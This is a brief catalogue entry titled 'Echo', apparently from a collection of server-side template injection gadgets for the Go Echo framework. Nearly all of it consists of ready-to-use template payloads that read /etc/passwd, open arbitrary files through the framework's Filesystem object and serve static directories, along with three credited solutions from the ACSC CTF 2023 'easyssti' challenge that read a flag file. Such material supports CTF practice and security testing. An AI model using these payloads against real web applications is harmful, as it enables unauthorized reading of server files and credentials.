---
title: "Echo"
description: "gadget

{{.File \"/etc/passwd\"}}
{{..Filesystem.Open \"/etc/passwd\"}}
{{..Static \"/meow\" \"/\"}}
Example:

ACSC CTF 2023 - easyssti

{{ $x := ..Filesystem.Open \"/flag\" }} {{ $x.Seek 1 0 }} {{ .Stream 200 \"text/plain\" $x }} (by @nyancat)
{{ (..Filesystem.Open \"/flag\").Read (.Get \"template\") }} {{ .Get \"template\" }} (by @maple3142)
{{ $f := ..Filesystem.Open \"/flag\" }} {{ $buf := .Get \"template\" }} {{ $f.Read $buf }} {{ $buf } (by @Ocean)





"
external_url: "https://github.com/labstack/echo"
category: "Miscellaneous"
---
